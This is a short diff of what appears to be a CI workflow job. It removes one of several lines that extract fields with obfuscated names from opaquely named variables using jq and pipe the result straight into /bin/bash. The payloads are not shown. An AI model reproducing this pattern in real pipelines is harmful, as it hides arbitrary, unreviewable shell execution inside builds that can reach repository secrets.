@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$gt45" | jq -r .bia37 | /bin/bash
           printf '%s' "$rr0" | jq -r .pruu1 | /bin/bash
           printf '%s' "$vv480" | jq -r .edtk044 | /bin/bash
-          echo $upgjy55 | jq -r .xil1 | /bin/bash
           echo $vzb179 | jq -r .iep7 | /bin/bash
           echo $fzy2 | jq -r .mlts90 | /bin/bash
 
